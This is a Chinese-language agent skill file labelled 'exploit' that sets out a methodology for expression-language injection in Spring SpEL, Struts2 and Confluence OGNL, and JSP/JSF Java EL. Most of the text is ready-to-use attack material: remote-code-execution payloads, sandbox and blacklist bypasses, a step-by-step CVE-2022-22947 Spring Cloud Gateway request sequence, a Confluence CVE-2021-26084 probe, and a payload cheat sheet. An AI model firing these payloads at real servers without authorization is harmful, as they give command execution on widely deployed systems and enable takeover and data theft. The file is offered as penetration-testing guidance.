---
name: expression-language-injection
description: "表达式语言(EL)注入方法论。当目标使用 Spring(SpEL)、Struts2(OGNL)、Confluence(OGNL)、JSP/JSF(Java EL) 且存在用户可控的表达式求值时使用。覆盖多语法探测与区分(${7*7}/#{7*7}/%{7*7})、SpEL RCE(Runtime.exec/ProcessBuilder/反射绕沙箱)、Spring Cloud Gateway CVE-2022-22947、OGNL RCE(_memberAccess 操纵/OgnlUtil 黑名单清除)、Struts2 经典 CVE(S2-045/S2-046/S2-016/S2-057)、Confluence CVE-2021-26084、Java EL RCE。任何涉及 Spring/Struts2/Confluence/JSF 框架的表达式注入测试都应使用此 skill"
metadata:
  tags: "EL injection,SpEL,OGNL,Java EL,expression language,Spring,Struts2,Confluence,JSF,CVE-2022-22947,CVE-2021-26084,S2-045"
  category: "exploit"
---

# 表达式语言(EL)注入方法论


**关键区分**：SSTI 针对模板渲染引擎；EL 注入针对 Java 框架中嵌入的**表达式求值器**。

---

## 1. 检测 — 多语法探测

```text
${7*7}              → 49 = SpEL、OGNL 或 Java EL
#{7*7}              → 49 = SpEL（替代语法）或 JSF EL
%{7*7}              → 49 = OGNL（Struts2）
${T(java.lang.Math).random()}  → 随机浮点数 = SpEL 确认
%{#context}         → 对象 dump = OGNL 确认
```

### 区分引擎

| `${7*7}` 响应 | `%{7*7}` 响应 | 引擎 |
|---|---|---|
| 49 | 原样 `%{7*7}` | SpEL 或 Java EL |
| 原样 `${7*7}` | 49 | OGNL（Struts2） |
| 49 | 49 | 两者可能同时存在 |

---

## 2. SpEL（Spring Expression Language）

### 出现位置

- `@Value("${...}")` 注解
- Spring Security 表达式（`@PreAuthorize`）
- Spring Cloud Gateway 路由谓词和过滤器
- Thymeleaf `th:text="${...}"`（配合 `__${...}__` 预处理时）
- Spring Data `@Query` 中的 SpEL

### RCE — Runtime.exec

```java
${T(java.lang.Runtime).getRuntime().exec("id")}
```

### RCE — 带输出回显（Commons IO）

```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("id").getInputStream())}
```

### RCE — 带输出回显（Spring StreamUtils）

```java
#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}
```

### ProcessBuilder（Runtime 被阻止时）

```java
${new java.lang.ProcessBuilder(new String[]{"id"}).start()}
```

### Spring Cloud Gateway — CVE-2022-22947

通过 actuator 添加含 SpEL 过滤器的恶意路由：

```bash
# 步骤 1: 添加路由（SpEL 在 filter 中）
POST /actuator/gateway/routes/hacktest
Content-Type: application/json
{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}"
    }
  }],
  "uri": "http://example.com",
  "predicates": [{"name": "Path", "args": {"_genkey_0": "/hackpath"}}]
}

# 步骤 2: 刷新路由
POST /actuator/gateway/refresh

# 步骤 3: 触发路由
GET /hackpath
# 响应头 "Result" 包含命令输出

# 步骤 4: 清理
DELETE /actuator/gateway/routes/hacktest
POST /actuator/gateway/refresh
```

### SpEL 沙箱绕过

当使用 `SimpleEvaluationContext`（限制 `T()` 操作符）时：

```java
${''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}
```

---

## 3. OGNL（Object-Graph Navigation Language）

### 出现位置

- Apache Struts2 — 主要 OGNL 消费者
- Confluence Server — 部分请求路径使用 OGNL
- 任何使用 `ognl.Ognl.getValue()`/`ognl.Ognl.setValue()` 的 Java 应用

### 基础 RCE

```
%{(#cmd='id').(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec(#cmd))}
```

### Struts2 沙箱绕过 — _memberAccess 操纵

Struts2 通过 `SecurityMemberAccess` 限制 OGNL。经典绕过：

```
%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

### OgnlUtil 黑名单清除

较新 Struts2 版本使用类/包黑名单，通过清除 `excludedClasses` 和 `excludedPackageNames` 绕过：

```
%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(#cmd='id').(#rt=@java.lang.Runtime@getRuntime().exec(#cmd))}
```

### Struts2 关键 CVE

| CVE | 向量 | Payload 位置 |
|---|---|---|
| S2-045（CVE-2017-5638） | Content-Type header | Content-Type 中 `%{...}` |
| S2-046（CVE-2017-5638） | Multipart filename | 上传文件名中 OGNL |
| S2-016（CVE-2013-2251） | `redirect:`/`redirectAction:` 前缀 | URL 参数 |
| S2-048（CVE-2017-9791） | Struts Showcase | ActionMessage 中 OGNL |
| S2-057（CVE-2018-11776） | Namespace OGNL | URL 路径 |

### Confluence OGNL — CVE-2021-26084

Confluence Server 通过 `queryString` 或 action 参数允许 OGNL 注入：

```bash
POST /pages/createpage-entervariables.action
Content-Type: application/x-www-form-urlencoded

queryString=%5cu0027%2b%7b3*3%7d%2b%5cu0027
# URL 解码: \u0027+{3*3}+\u0027
# 如果响应包含 9 → 确认存在 OGNL 注入
# 升级到 Runtime.exec 实现 RCE
```

---

## 4. Java EL（JSP / JSF）

### 出现位置

- JSP 页面：`${expression}` 和 `#{expression}`
- JSF（JavaServer Faces）：值和方法绑定
- 自定义标签库

### RCE Payload

```java
// Java EL + Runtime:
${Runtime.getRuntime().exec("id")}

// 通过 pageContext（JSP）:
${pageContext.request.getServletContext().getClassLoader()}

// 反射方式:
${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
```

---

## 5. 决策树

```
输入反射且 ${7*7} 返回 49？
├── Java 应用？
│   ├── Struts2？→ 尝试 %{...} OGNL payload
│   │   └── 检查 Content-Type 注入（S2-045）
│   ├── Spring？→ 尝试 T(java.lang.Runtime) SpEL
│   │   └── 检查 /actuator/gateway（Spring Cloud Gateway）
│   ├── Confluence？→ 尝试 OGNL via action 参数
│   └── JSP/JSF？→ 尝试 Java EL payload
│
├── 错误信息暴露框架？
│   ├── "ognl.OgnlException" → OGNL
│   ├── "SpelEvaluationException" → SpEL
│   └── "javax.el.ELException" → Java EL
│
└── 被沙箱阻止？
    ├── OGNL: 清除 _memberAccess / excludedClasses
    ├── SpEL: 反射绕过 SimpleEvaluationContext
    └── 尝试替代执行方式（ProcessBuilder, ScriptEngine）
```

---

## 6. 速查

```text
# SpEL RCE:
${T(java.lang.Runtime).getRuntime().exec("id")}

# OGNL RCE (Struts2):
%{(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}

# OGNL + 沙箱绕过:
%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}

# Java EL RCE:
${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}

# Confluence CVE-2021-26084 探测:
queryString=\u0027%2b{3*3}%2b\u0027

# Spring Cloud Gateway CVE-2022-22947:
POST /actuator/gateway/routes/x  → SpEL in filter args
POST /actuator/gateway/refresh
```

## 深入参考

- EL/SpEL/OGNL RCE payload 与沙箱绕过 → [references/el-exploitation.md](references/el-exploitation.md)
